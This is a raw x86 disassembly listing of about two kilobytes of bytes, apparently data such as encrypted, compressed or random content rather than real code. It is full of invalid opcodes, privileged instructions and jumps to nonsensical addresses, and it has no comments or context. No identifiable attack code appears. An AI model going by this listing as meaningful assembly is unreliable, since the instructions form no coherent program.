  4110ef:	rcr    DWORD PTR [edx-0x55],1
  4110f2:	and    dl,BYTE PTR ds:0x115f554e
  4110f8:	sbb    DWORD PTR [eax-0x11],ebx
  4110fb:	add    ecx,DWORD PTR [ebx-0x16]
  4110fe:	pusha  
  4110ff:	cmp    BYTE PTR [ebp+0x3407ded0],ch
  411105:	xor    esi,edx
  411107:	push   ds
  411108:	mov    esp,0x2a62cdd2
  41110d:	push   es
  41110e:	add    ah,BYTE PTR [ebp+0x72]
  411111:	xor    BYTE PTR [edi-0x28fda1fe],bh
  411117:	arpl   WORD PTR [ebp+0x7e],ax
  41111a:	inc    esp
  41111b:	push   ebp
  41111c:	mov    ebx,0xab02b7d4
  411121:	out    dx,eax
  411122:	push   cs
  411123:	push   cs
  411124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411125:	test   al,0x98
  411127:	add    DWORD PTR [edi],edi
  411129:	gs jno 0x4110b2
  41112c:	jecxz  0x4110ba
  41112e:	sbb    bl,BYTE PTR [edi-0x64]
  411131:	mov    al,0x40
  411133:	or     ch,ch
  411135:	lahf   
  411136:	int    0x2b
  411138:	lock mov ecx,0xa1626dfa
  41113e:	scas   al,BYTE PTR es:[edi]
  41113f:	test   DWORD PTR [ecx-0x63c4ab31],ebx
  411145:	hlt    
  411146:	cli    
  411147:	dec    ebx
  411148:	dec    edi
  411149:	add    esp,DWORD PTR [ecx-0x61]
  41114c:	mov    al,ds:0xd99c3f84
  411151:	ss lahf 
  411153:	in     eax,0x74
  411155:	lds    esi,FWORD PTR [edx+esi*4+0x0]
  411159:	test   al,0x26
  41115b:	loopne 0x41113c
  41115d:	fisubr DWORD PTR [ecx]
  41115f:	xor    cl,al
  411161:	fadd   QWORD PTR [esi+0x2d]
  411164:	sub    al,0x4f
  411166:	mov    ah,0xa6
  411168:	dec    esi
  411169:	sti    
  41116a:	lods   al,BYTE PTR ds:[esi]
  41116b:	sbb    DWORD PTR [esi],0x17287345
  411171:	jb     0x411141
  411173:	xor    al,0xb3
  411175:	xchg   ebp,eax
  411176:	out    dx,eax
  411177:	mov    dh,0xc3
  411179:	push   ebp
  41117a:	enter  0xa6cc,0xae
  41117e:	push   edx
  41117f:	mul    DWORD PTR [eax+0x3b]
  411182:	fbld   TBYTE PTR [edi+0xa]
  411185:	mov    al,0xeb
  411187:	das    
  411188:	push   0x4e
  41118a:	cmp    eax,0x7e227202
  41118f:	mov    esi,0x402c338a
  411194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411195:	mov    cl,0xc9
  411197:	cmp    DWORD PTR [ebx+0x34],ebx
  41119a:	lods   al,BYTE PTR ds:[esi]
  41119b:	dec    edi
  41119c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41119d:	dec    edx
  41119e:	cmp    al,0x4a
  4111a0:	mov    ds:0x9b53d225,eax
  4111a5:	fidivr DWORD PTR [ecx-0x74]
  4111a8:	mov    eax,0xba335204
  4111ad:	push   0x7c
  4111af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111b0:	lahf   
  4111b1:	and    esp,DWORD PTR [esi]
  4111b3:	lds    edx,FWORD PTR [edi+0x38b9de4d]
  4111b9:	rol    BYTE PTR [esi],1
  4111bb:	loope  0x41123c
  4111bd:	dec    ebx
  4111be:	push   ds
  4111bf:	jbe    0x4111d2
  4111c1:	fstp   DWORD PTR [ebp-0xd6b81ef]
  4111c7:	mov    ebx,0x3cf05eea
  4111cc:	xchg   esp,eax
  4111cd:	add    DWORD PTR [eax],edi
  4111cf:	iret   
  4111d0:	out    0x15,eax
  4111d2:	aas    
  4111d3:	push   ebx
  4111d4:	adc    eax,0xc0c7daf3
  4111d9:	in     al,dx
  4111da:	xchg   dl,ch
  4111dc:	(bad)  
  4111dd:	jnp    0x411212
  4111df:	test   al,0xb3
  4111e1:	cmp    BYTE PTR [esi+0x274062fe],ch
  4111e7:	imul   ebx,DWORD PTR [edx+0x34efb0c],0xffffff83
  4111ee:	sbb    BYTE PTR [ecx+eiz*1+0x3f],bh
  4111f2:	jne    0x4111a1
  4111f4:	cli    
  4111f5:	mov    ah,0x75
  4111f7:	ret    
  4111f8:	jecxz  0x41123b
  4111fa:	push   ebp
  4111fb:	adc    BYTE PTR [edi-0xd8988e2],dh
  411201:	jg     0x4111d4
  411203:	out    0x65,eax
  411205:	mov    ecx,edx
  411207:	sub    dh,dl
  411209:	(bad)  
  41120a:	sub    eax,DWORD PTR [edx-0x4e]
  41120d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41120e:	retf   0xa8a2
  411211:	mov    dl,0x6c
  411213:	inc    ecx
  411214:	jno    0x411213
  411216:	test   BYTE PTR [ebx+0x26a2a773],al
  41121c:	inc    eax
  41121d:	sti    
  41121e:	cmp    DWORD PTR [ebx],edi
  411220:	sti    
  411221:	sub    al,0xd2
  411223:	xor    DWORD PTR [esi+ebp*2-0x18e2eca1],edi
  41122a:	idiv   DWORD PTR cs:[ebx]
  41122d:	dec    ebp
  41122e:	call   0x4148:0xbb0667e1
  411235:	add    BYTE PTR [ebx-0x45ccf211],ah
  41123b:	sub    eax,0x73b22385
  411240:	pushf  
  411241:	in     al,dx
  411242:	mov    ah,0x22
  411244:	ja     0x411292
  411246:	cli    
  411247:	out    dx,eax
  411248:	iret   
  411249:	cmp    dh,BYTE PTR [ebx+ecx*1-0x42]
  41124d:	in     eax,0xac
  41124f:	shl    DWORD PTR [ecx-0x10],cl
  411252:	cmp    WORD PTR [ebp+0x41],bp
  411256:	dec    eax
  411257:	mov    DWORD PTR [eax+0x6],esp
  41125a:	jo     0x411261
  41125c:	xor    BYTE PTR [ebx+0x1f],dl
  41125f:	jb     0x411238
  411261:	hlt    
  411262:	lds    ebx,FWORD PTR [edi]
  411264:	jmp    0x4111e8
  411266:	ret    
  411267:	mov    dh,0xf7
  411269:	push   esi
  41126a:	ret    
  41126b:	inc    ecx
  41126c:	sub    al,0xe1
  41126e:	in     eax,0xbc
  411270:	add    eax,0xa486f1e5
  411275:	(bad)  [esi-0x10542bba]
  41127b:	jo     0x4112c7
  41127d:	dec    esi
  41127e:	jmp    0x165d82c7
  411283:	neg    DWORD PTR [eax+edi*1-0x6cf743f3]
  41128a:	lea    edx,[ecx+0x22]
  41128d:	dec    edx
  41128e:	inc    eax
  41128f:	outs   dx,DWORD PTR ds:[esi]
  411290:	(bad)  
  411291:	mov    esi,0xaed0ec1c
  411296:	mov    al,cl
  411298:	stos   BYTE PTR es:[edi],al
  411299:	(bad)  
  41129a:	bound  ecx,QWORD PTR [ebp+0x7b893804]
  4112a0:	out    0xc5,al
  4112a2:	cmp    al,BYTE PTR [esi-0x41]
  4112a5:	into   
  4112a6:	and    edx,DWORD PTR [esi-0x19]
  4112a9:	cmp    BYTE PTR [eax-0x4b55f657],ch
  4112af:	mov    esi,0xa3714bb2
  4112b4:	sbb    eax,0x450c6dad
  4112b9:	fs cli 
  4112bb:	hlt    
  4112bc:	sti    
  4112bd:	leave  
  4112be:	mov    eax,0x2c60b516
  4112c3:	ins    BYTE PTR es:[edi],dx
  4112c4:	inc    esp
  4112c5:	sbb    DWORD PTR [ecx],ecx
  4112c7:	or     al,0x16
  4112c9:	hlt    
  4112ca:	sub    cl,BYTE PTR [eax+0x25]
  4112cd:	ret    0x54a0
  4112d0:	mov    bl,0x58
  4112d2:	add    bh,bh
  4112d4:	(bad)  
  4112d5:	mov    esp,edx
  4112d7:	mov    edx,0xf9733ef5
  4112dc:	cmp    BYTE PTR [eax+esi*8-0x202285ea],0xbd
  4112e4:	add    al,0x1d
  4112e6:	aas    
  4112e7:	test   DWORD PTR [edx-0x69],0x576a1d75
  4112ee:	or     cl,bh
  4112f0:	fs out 0xc2,al
  4112f3:	sbb    BYTE PTR [edi],dh
  4112f5:	frstor [edi-0x21cab69]
  4112fb:	jmp    0xcf7b:0xd8fb59b2
  411302:	push   esi
  411303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411304:	mov    ah,dl
  411306:	iret   
  411307:	push   ebx
  411308:	cmp    eax,0x94030059
  41130d:	mov    BYTE PTR [ecx+ecx*2],bh
  411310:	(bad)  
  411311:	enter  0x119b,0x92
  411315:	pop    edi
  411316:	lds    ebp,FWORD PTR [eax+0x52]
  411319:	dec    eax
  41131a:	and    cl,al
  41131c:	adc    ch,ah
  41131e:	pop    ebp
  41131f:	iret   
  411320:	xor    al,0x10
  411322:	fsub   QWORD PTR [ebx-0x5ad927ae]
  411328:	daa    
  411329:	popf   
  41132a:	clts   
  41132c:	idiv   BYTE PTR ds:0x956227ee
  411332:	mov    BYTE PTR [ecx+0x6dc014e8],0x91
  411339:	fmul   DWORD PTR [ecx+eiz*1]
  41133c:	stos   DWORD PTR es:[edi],eax
  41133d:	fdivrp st(1),st
  41133f:	or     BYTE PTR [esi+0x44f7b0db],al
  411345:	es push ds
  411347:	push   ebp
  411348:	add    eax,0x299496c8
  41134d:	jecxz  0x4113c9
  41134f:	(bad)  
  411350:	sbb    DWORD PTR [edx],esp
  411352:	rcl    BYTE PTR [ebp+eax*8+0xb9f66fe],cl
  411359:	cs iret 
  41135b:	jno    0xc64b2b88
  411361:	xor    ebx,ecx
  411363:	push   ebx
  411364:	repnz sar edx,0xd1
  411368:	fild   WORD PTR [ecx]
  41136a:	jae    0x41139b
  41136c:	fs shr eax,1
  41136f:	stos   DWORD PTR es:[edi],eax
  411370:	ja     0x41134d
  411372:	hlt    
  411373:	test   edi,eax
  411375:	cmc    
  411376:	push   ebp
  411377:	mov    ebp,0xa985246c
  41137c:	mov    ecx,DWORD PTR [eax+0x2dcb13d8]
  411382:	sub    DWORD PTR [ebp-0x1c],ebp
  411385:	repz and al,0xa2
  411388:	mov    edx,0xeddd249
  41138d:	cwde   
  41138e:	sub    DWORD PTR ds:0xf85768a1,edx
  411394:	sub    BYTE PTR [edx],0xb3
  411397:	dec    ebp
  411398:	cmp    eax,0x9fa729f4
  41139d:	std    
  41139e:	push   0x7a665b19
  4113a3:	cmp    eax,0xc78dbf98
  4113a8:	ins    BYTE PTR es:[edi],dx
  4113a9:	or     BYTE PTR [ecx-0x3cd2290c],ch
  4113af:	shr    BYTE PTR [ecx+ebx*2-0x2e],cl
  4113b3:	sub    al,BYTE PTR [eax]
  4113b5:	jp     0x411366
  4113b7:	std    
  4113b8:	in     eax,dx
  4113b9:	popf   
  4113ba:	stc    
  4113bb:	lea    ebp,[esi-0x100a35e5]
  4113c1:	sub    edi,edi
  4113c3:	mov    ah,0xff
  4113c5:	scas   eax,DWORD PTR es:[edi]
  4113c6:	mov    cl,cl
  4113c8:	sbb    eax,0x2f0e02a9
  4113cd:	and    eax,0x6f3bbf88
  4113d2:	cs dec ebx
  4113d4:	xchg   edi,eax
  4113d5:	rcr    BYTE PTR [ecx-0x1d],0x54
  4113d9:	test   al,0x6a
  4113db:	mov    al,0x60
  4113dd:	cmp    eax,0x56bf526a
  4113e2:	jecxz  0x411406
  4113e4:	enter  0xe06c,0x5
  4113e8:	xor    eax,ecx
  4113ea:	fistp  QWORD PTR [edi+ebp*4]
  4113ed:	mov    BYTE PTR [edi],bh
  4113ef:	inc    esp
  4113f0:	call   0x33122166
  4113f5:	lods   eax,DWORD PTR ds:[esi]
  4113f6:	xchg   esi,eax
  4113f7:	mov    esp,0xcb4f4bd2
  4113fc:	adc    dh,BYTE PTR [esi]
  4113fe:	cdq    
  4113ff:	push   0x28
  411401:	lods   eax,DWORD PTR ds:[esi]
  411402:	cmp    al,0xd
  411404:	xchg   edi,eax
  411405:	scas   eax,DWORD PTR es:[edi]
  411406:	dec    ecx
  411407:	icebp  
  411408:	fs xor edx,esi
  41140b:	dec    ebp
  41140c:	cmp    esi,DWORD PTR ds:0xf1c81346
  411412:	sub    esi,DWORD PTR [ebx+0x78]
  411415:	cwde   
  411416:	dec    ebx
  411417:	mov    eax,gs:0x67536f20
  41141d:	pop    ss
  41141e:	mov    bh,0x1b
  411420:	adc    al,0x93
  411422:	mov    edi,0x6e84b63a
  411427:	mov    ch,0x6c
  411429:	push   edx
  41142a:	pop    edx
  41142b:	jmp    0xb81b2d40
  411430:	adc    BYTE PTR [ebx-0x49],al
  411433:	or     BYTE PTR [ebp-0xe4c0ccb],dh
  411439:	and    DWORD PTR [ebx+0x40623cac],ebx
  41143f:	jmp    0x60830241
  411444:	xchg   ebp,eax
  411445:	push   esi
  411446:	adc    edi,DWORD PTR ds:0x8a37acc7
  41144c:	in     al,0x93
  41144e:	mov    cl,0x2b
  411450:	jle    0x4114d1
  411452:	jecxz  0x4113ef
  411454:	mov    ch,0xae
  411456:	push   ecx
  411457:	imul   eax,DWORD PTR [ebx+0x48156e59],0xffffffa8
  41145e:	push   ecx
  41145f:	pmullw mm6,QWORD PTR [ebx-0x43]
  411463:	(bad)  [edx+0x536e0686]
  411469:	sub    esi,DWORD PTR [ebx+0x4f80af16]
  41146f:	jg     0x411454
  411471:	mov    ecx,0x9f39cf10
  411476:	cld    
  411477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411478:	retf   
  411479:	and    al,0x5a
  41147b:	ja     0x41147c
  41147d:	repnz cmp bh,BYTE PTR [esp+edi*1]
  411481:	and    bh,BYTE PTR [eax-0x413cacac]
  411487:	test   BYTE PTR [edx],ch
  411489:	pop    ebx
  41148a:	pop    esi
  41148b:	mov    edx,0xb8c51982
  411490:	and    dh,bh
  411492:	or     dl,BYTE PTR [esi]
  411494:	xlat   BYTE PTR ds:[ebx]
  411495:	jo     0x4114c7
  411497:	cmc    
  411498:	inc    ebx
  411499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149a:	mov    edi,0x57a1a9a0
  41149f:	(bad)  
  4114a0:	fisttp WORD PTR [edi-0x77]
  4114a3:	inc    ebx
  4114a4:	inc    edi
  4114a5:	ins    DWORD PTR es:[edi],dx
  4114a6:	sbb    al,0xda
  4114a8:	push   edx
  4114a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114aa:	push   es
  4114ab:	daa    
  4114ac:	push   cs
  4114ad:	test   al,0xcb
  4114af:	pusha  
  4114b0:	inc    ebp
  4114b1:	mov    al,ds:0xb95faf66
  4114b6:	mov    ebp,0xdb5bb14d
  4114bb:	sbb    al,0x58
  4114bd:	repnz dec edx
  4114bf:	sahf   
  4114c0:	adc    BYTE PTR [ecx],0xc4
  4114c3:	bound  ebx,QWORD PTR [eax]
  4114c5:	test   DWORD PTR [edx],ebx
  4114c7:	jno    0x411482
  4114c9:	pop    ebp
  4114ca:	enter  0x564a,0xa
  4114ce:	and    ebp,DWORD PTR [edx+0x48858c75]
  4114d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d5:	pop    ebp
  4114d6:	fiadd  DWORD PTR [ebx]
  4114d8:	icebp  
  4114d9:	pop    ss
  4114da:	push   esp
  4114db:	dec    edx
  4114dc:	xor    ah,BYTE PTR [ecx-0x2be04119]
  4114e2:	loope  0x41152a
  4114e4:	pop    ds
  4114e5:	imul   eax,DWORD PTR [ebx+0x66],0x40
  4114e9:	rol    BYTE PTR [edx+0x54],0x2c
  4114ed:	pushf  
  4114ee:	jae    0x4114ff
  4114f0:	add    BYTE PTR [eax],bl
  4114f2:	out    0x4b,al
  4114f4:	dec    esp
  4114f5:	fsubr  DWORD PTR [eax-0x33]
  4114f8:	repz mov ecx,0x1b2ce2b2
  4114fe:	dec    ah
  411500:	test   BYTE PTR [esi],dl
  411502:	cmp    dh,BYTE PTR [ecx]
  411504:	mov    eax,ds:0x17263117
  411509:	ins    BYTE PTR es:[edi],dx
  41150a:	push   0x64
  41150c:	mov    BYTE PTR ss:[edx-0x3bb0a84f],al
  411513:	pop    ebp
  411514:	dec    esi
  411515:	cmp    bh,BYTE PTR [edi]
  411517:	sub    ah,dl
  411519:	call   0x47b73a77
  41151e:	dec    edi
  41151f:	out    dx,al
  411520:	mov    ebx,0xa7f04d43
  411526:	sub    eax,DWORD PTR [ebx-0x6796681e]
  41152c:	idiv   BYTE PTR [eax+esi*2+0x7f691ca]
  411533:	mov    dl,BYTE PTR [edi-0x2dd4a2fe]
  411539:	mov    al,0xa9
  41153b:	push   0xffffffcf
  41153d:	into   
  41153e:	jge    0x41157c
  411540:	mov    ebp,0xd50c961
  411545:	sbb    BYTE PTR [eax+0x68],cl
  411548:	sbb    DWORD PTR [ebx+0x35],ebx
  41154b:	fisttp WORD PTR [eax-0x30]
  41154e:	dec    ecx
  41154f:	mov    al,ds:0xe8ae67fa
  411554:	cmp    BYTE PTR [eax],al
  411556:	xor    eax,0x27a7ec84
  41155b:	fld    QWORD PTR [eax+0x1917b3f5]
  411561:	in     eax,dx
  411562:	js     0x411537
  411564:	mov    edx,edi
  411566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411567:	sub    al,0xcd
  411569:	sbb    bl,dl
  41156b:	jmp    0x3f39:0x46decc8e
  411572:	inc    edx
  411573:	inc    eax
  411574:	ins    DWORD PTR es:[edi],dx
  411575:	jnp    0x4115ef
  411577:	loopne 0x411522
  411579:	jno    0x4115f7
  41157b:	in     al,dx
  41157c:	inc    edi
  41157d:	retf   0x242b
  411580:	push   cs
  411581:	sti    
  411582:	fcmove st,st(1)
  411584:	nop
  411585:	mov    bl,0x6b
  411587:	(bad)  
  411589:	dec    esi
  41158a:	loope  0x411573
  41158c:	sbb    BYTE PTR [ebp-0x1de2b61f],ch
  411592:	cs stos BYTE PTR es:[edi],al
  411594:	sar    BYTE PTR [esi+ebp*1],1
  411597:	mov    cl,0xb7
  411599:	lea    ebp,[eax-0x13]
  41159c:	mov    bh,0x43
  41159e:	push   ds
  41159f:	sub    al,0x3a
  4115a1:	mov    WORD PTR [ecx-0x16],ds
  4115a4:	sbb    DWORD PTR [eax-0x6a1fa5e7],eax
  4115aa:	cdq    
  4115ab:	xor    ch,bl
  4115ad:	add    al,0x7b
  4115af:	and    bh,BYTE PTR ds:0x1c0ef61c
  4115b5:	xchg   WORD PTR [edx+eax*4-0x7f],di
  4115ba:	(bad)  
  4115bb:	jb     0x411628
  4115bd:	iret   
  4115be:	sahf   
  4115bf:	popa   
  4115c0:	xchg   edi,eax
  4115c1:	fisub  WORD PTR [ecx-0x2ac9f023]
  4115c7:	xchg   BYTE PTR [esi-0x10],ah
  4115ca:	idiv   DWORD PTR [edi+0x61b0fd86]
  4115d0:	daa    
  4115d1:	in     eax,0x29
  4115d3:	push   edi
  4115d4:	stos   BYTE PTR es:[edi],al
  4115d5:	and    eax,0x1658f4ae
  4115da:	lds    edx,FWORD PTR [ecx]
  4115dc:	dec    eax
  4115dd:	je     0x4115d8
  4115df:	std    
  4115e0:	jnp    0x41165f
  4115e2:	gs out 0x82,eax
  4115e5:	sub    BYTE PTR [eax-0x22c96dfa],al
  4115eb:	iret   
  4115ec:	jp     0x411669
  4115ee:	fcomp  QWORD PTR [ebx+0x2c]
  4115f1:	cs push esp
  4115f3:	sahf   
  4115f4:	jbe    0x411651
  4115f6:	or     ebx,DWORD PTR [eax+0x520869ef]
  4115fc:	inc    ebx
  4115fd:	fstp   QWORD PTR [edx+0x6127fd14]
  411603:	pushf  
  411604:	sub    DWORD PTR [edx+0x66f8ec90],0x5e
  41160b:	xor    bl,BYTE PTR [edx-0x4c]
  41160e:	adc    esp,ebp
  411610:	add    DWORD PTR [eax-0x387a9e7a],edx
  411616:	add    ebp,DWORD PTR [esp+edi*1]
  411619:	outs   dx,DWORD PTR ds:[esi]
  41161a:	adc    al,0x13
  41161c:	js     0x4115ac
  41161e:	sar    DWORD PTR [edi],1
  411620:	scas   al,BYTE PTR es:[edi]
  411621:	rcl    ecx,cl
  411623:	or     dh,BYTE PTR [ecx-0x6b9573ba]
  411629:	add    eax,0xb7fdbd99
  41162e:	fwait
  41162f:	or     DWORD PTR [ecx+0x93736c],ebp
  411635:	xchg   ebp,eax
  411636:	cmp    al,dh
  411638:	mov    edi,0xc13b0fa7
  41163d:	aas    
  41163e:	sub    ecx,DWORD PTR [eax]
  411640:	push   ebx
  411641:	jmp    0x488f68ef
  411646:	jl     0x4115dc
  411648:	pop    edi
  411649:	sub    dl,ah
  41164b:	xchg   esp,eax
  41164c:	sub    bl,BYTE PTR [ecx-0x30]
  41164f:	inc    esp
  411650:	loop   0x4115de
  411652:	(bad)  
  411653:	and    eax,0x826c8f01
  411658:	mov    eax,esi
  41165a:	sub    ah,bh
  41165c:	dec    esp
  41165d:	shl    DWORD PTR [ecx-0x3],1
  411660:	stc    
  411661:	inc    ebp
  411662:	out    dx,al
  411663:	pop    edx
  411664:	sbb    BYTE PTR [edi+0x1a],bl
  411667:	adc    ch,BYTE PTR [esi]
  411669:	(bad)  
  41166a:	mov    eax,ds:0x12f01d28
  41166f:	cs and edx,esp
  411672:	push   0xffffff8e
  411674:	xchg   ebx,eax
  411675:	and    eax,0x8628a8b7
  41167a:	inc    edi
  41167b:	test   DWORD PTR ds:0xdc8513fd,esi
  411681:	(bad)  
  411682:	sub    esi,ebp
  411684:	leave  
  411685:	push   esi
  411686:	leavew 
  411688:	pop    ss
  411689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168a:	pop    ecx
  41168b:	bnd jns 0x4116ed
  41168e:	loopne 0x411691
  411690:	add    eax,0xd20c6ef9
  411695:	jns    0x4116e6
  411697:	sbb    BYTE PTR [edi-0x368bad33],bh
  41169d:	ret    0xc1e7
  4116a0:	dec    ebx
  4116a1:	xchg   BYTE PTR [ecx-0x12d74101],dh
  4116a7:	sbb    ecx,0xa5e9f99e
  4116ad:	jae    0x411643
  4116af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b0:	mov    dl,0x3d
  4116b2:	ins    DWORD PTR es:[edi],dx
  4116b3:	sar    ah,1
  4116b5:	add    ah,bl
  4116b7:	jmp    0x4116cb
  4116b9:	fcom   DWORD PTR [ebp-0x30]
  4116bc:	repnz or DWORD PTR [edi-0x46],edx
  4116c0:	dec    edi
  4116c1:	and    al,0x1d
  4116c3:	or     eax,0x94617cff
  4116c8:	popf   
  4116c9:	mov    al,ds:0x55eda96b
  4116ce:	mov    ebp,0xc2ebf401
  4116d3:	mov    edx,0xffebccdf
  4116d8:	pop    ecx
  4116d9:	ret    
  4116da:	les    edi,FWORD PTR [ebx+edi*2]
  4116dd:	outs   dx,BYTE PTR ds:[esi]
  4116de:	ficom  WORD PTR [ebx-0x54]
  4116e1:	inc    eax
  4116e2:	push   0xd3ab05cc
  4116e7:	xchg   ah,cl
  4116e9:	pop    ebx
  4116ea:	push   ebp
  4116eb:	out    0xa0,al
  4116ed:	cmp    DWORD PTR [eax],eax
  4116ef:	scas   al,BYTE PTR es:[edi]
  4116f0:	pop    edi
  4116f1:	int    0xd5
  4116f3:	test   al,0x13
  4116f5:	call   0x28cb3888
  4116fa:	je     0x411717
  4116fc:	aad    0x6a
  4116fe:	dec    eax
  4116ff:	test   al,0xda
  411701:	lar    esp,sp
  411704:	js     0x411780
  411706:	xchg   edx,eax
  411707:	(bad)  
  411708:	mov    bl,dh
  41170a:	push   ebp
  41170b:	xlat   BYTE PTR ds:[ebx]
  41170c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41170d:	cdq    
  41170e:	in     al,dx
  41170f:	into   
  411710:	nop
  411711:	and    DWORD PTR [edi+ebx*8-0x6f32448f],edi
  411718:	jo     0x411791
  41171a:	jp     0x4116fc
  41171c:	jecxz  0x4116c9
  41171e:	jmp    0xa9b6:0x9f26ce4a
  411725:	ret    0x3ae6
  411728:	cdq    
  411729:	inc    esi
  41172a:	adc    bl,BYTE PTR [ebp-0x2da99d50]
  411730:	fucomi st,st(5)
  411732:	mov    eax,0x2bfd64c
  411737:	add    edx,DWORD PTR [edi]
  411739:	xchg   edi,eax
  41173a:	sbb    dl,BYTE PTR [eax]
  41173c:	or     DWORD PTR [edx],edx
  41173e:	and    DWORD PTR [edx-0x52],eax
  411741:	xchg   DWORD PTR [ebx-0x7086a86],eax
  411747:	cmc    
  411748:	pop    ebp
  411749:	mov    edx,0xc222418a
  41174e:	and    eax,0x80d3a5d3
  411753:	mov    eax,ds:0xe74aea6a
  411758:	je     0x41170e
  41175a:	dec    esp
  41175b:	out    dx,eax
  41175c:	call   0x779d:0x27ec23b9
  411763:	ja     0x411716
  411765:	and    DWORD PTR ds:0x77ad5a4d,ebp
  41176b:	es mov edi,0xd3fac49f
  411771:	cmc    
  411772:	(bad)  
  411773:	out    dx,eax
  411774:	cld    
  411775:	hlt    
  411776:	mov    al,0x7d
  411778:	pop    di
  41177a:	mov    ebx,0xfa8cb32d
  41177f:	push   ebp
  411780:	mov    edi,0x6923edb4
  411785:	aaa    
  411786:	ss sahf 
  411788:	dec    edi
  411789:	sub    DWORD PTR [edi+0x54],0x1c5dfae5
  411790:	mov    ds:0x4d8be5a5,eax
  411795:	add    al,0xba
  411797:	cmc    
  411798:	stos   BYTE PTR es:[edi],al
  411799:	xchg   al,dh
  41179b:	xchg   esp,eax
  41179c:	cmp    BYTE PTR [ebx],cl
  41179e:	pop    ds
  41179f:	in     eax,0x9a
  4117a1:	inc    edx
  4117a2:	xor    BYTE PTR [ebx+0x4b],cl
  4117a5:	mov    ecx,0xee41bebe
  4117aa:	mov    DWORD PTR [ebx],esi
  4117ac:	dec    edx
  4117ad:	pop    ds
  4117ae:	mov    ecx,0x2e97230b
  4117b3:	repnz popf 
  4117b5:	shl    ebp,cl
  4117b7:	jge    0x4117da
  4117b9:	jle    0x4117ea
  4117bb:	pop    ebp
  4117bc:	xchg   ebx,eax
  4117bd:	pop    esi
  4117be:	push   ecx
  4117bf:	xchg   edx,eax
  4117c0:	or     eax,edi
  4117c2:	enter  0xe5a2,0x27
  4117c6:	dec    ecx
  4117c7:	add    cl,BYTE PTR [esi+0x69]
  4117ca:	dec    esp
  4117cb:	push   cs
  4117cc:	add    ecx,DWORD PTR [esi-0x2cacf7a8]
  4117d2:	stos   DWORD PTR es:[edi],eax
  4117d3:	es jns 0x4117ee
  4117d6:	std    
  4117d7:	gs (bad) 
  4117d9:	(bad)  
  4117db:	je     0x411838
  4117dd:	xchg   esp,esp
  4117df:	repnz imul edi,ebx,0x23
  4117e3:	adc    ecx,edi
  4117e5:	fidiv  DWORD PTR [edi+ebp*4]
  4117e8:	gs movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117eb:	je     0x411851
  4117ed:	jge    0x411852
  4117ef:	cli    
  4117f0:	mov    ds:0x25ba2119,eax
  4117f5:	cwde   
  4117f6:	sbb    BYTE PTR [edi],cl
  4117f8:	into   
  4117f9:	xor    eax,0xf486fcf1
  4117fe:	mov    al,ds:0x33bb597e
  411803:	pop    ss
  411804:	lea    esi,[edx+0x26f95c53]
  41180a:	iret   
  41180b:	rol    DWORD PTR [esi],cl
  41180d:	fs in  eax,0x7a
  411810:	pop    edi
  411811:	daa    
  411812:	retf   0x4d05
  411815:	scas   eax,DWORD PTR es:[edi]
  411816:	push   ds
  411817:	mov    ebx,0xf82a99c3
  41181c:	cmp    eax,ecx
  41181e:	sahf   
  41181f:	or     al,0x38
  411821:	pop    ebp
  411822:	data16 fcomp QWORD PTR [edi+0x312d6950]
  411829:	adc    eax,0xbc0b1e55
  41182e:	push   ebx
  41182f:	or     ch,dh
  411831:	inc    edi
  411832:	mov    edi,0xf59ba7e5
  411837:	cmp    eax,ebx
  411839:	inc    eax
  41183a:	dec    edi
  41183b:	mov    ebx,0xce26b83
  411840:	in     al,0xda
  411842:	lods   al,BYTE PTR ds:[esi]
  411843:	ds int 0x86
  411846:	push   ax
  411848:	mov    ecx,0x1a4125b5
  41184d:	gs gs jl 0x411819
  411851:	jl     0x411833
  411853:	addr16 xor al,0x63
  411856:	cmp    BYTE PTR [edi+0x41768bdf],bl
  41185c:	(bad)  
  41185d:	cdq    
  41185e:	js     0x4118c2
  411860:	dec    edx
  411861:	jae    0x411802
  411863:	dec    eax
  411864:	and    ebx,DWORD PTR [eax]
  411866:	jo     0x41180f
  411868:	stc    
  411869:	jp     0x41188f
  41186b:	mov    ch,0x14
  41186d:	mov    ds:0x40f708d4,eax
  411872:	(bad)  
  411873:	fdivr  DWORD PTR fs:[ecx-0xcab9761]
  41187a:	ror    edx,1
  41187c:	dec    esp
  41187d:	cmp    DWORD PTR [ecx-0x62],edx
  411880:	retf   0x1699
  411883:	adc    al,0x19
  411885:	adc    edx,edi
  411887:	or     cl,cl
  411889:	sahf   
  41188a:	scas   eax,DWORD PTR es:[edi]
  41188b:	lods   al,BYTE PTR ds:[esi]
  41188c:	popf   
  41188d:	and    al,0xed
  41188f:	sar    ch,cl
  411891:	push   esi
  411892:	mov    eax,ds:0x8ffe162b
  411897:	pop    es
  411898:	sub    BYTE PTR [esi+0x40247ea1],ch
  41189e:	or     eax,0xaa471f16
  4118a3:	repnz sahf 
  4118a5:	push   edi
  4118a6:	scas   eax,DWORD PTR es:[edi]
  4118a7:	(bad)  
  4118a8:	mov    edi,0xfd1a7192
  4118ad:	clc    
  4118ae:	mov    ebx,0xe4f2a085
  4118b3:	jns    0x411869
  4118b5:	xchg   ebx,eax
  4118b6:	mov    edx,0xa837846a
  4118bb:	imul   edi,DWORD PTR ds:0x25a91394,0x3eb98f93
  4118c5:	mov    ds:0xd730a587,al
  4118ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118cb:	mov    edx,0x924b6321
  4118d0:	call   0x8f3e704b
  4118d5:	nop
  4118d6:	pop    ds
  4118d7:	sahf   
  4118d8:	inc    ecx
  4118d9:	add    eax,0x1bb8eea
  4118de:	xchg   esp,eax
  4118df:	into   
  4118e0:	pop    ds
  4118e1:	dec    esi
  4118e2:	iret   
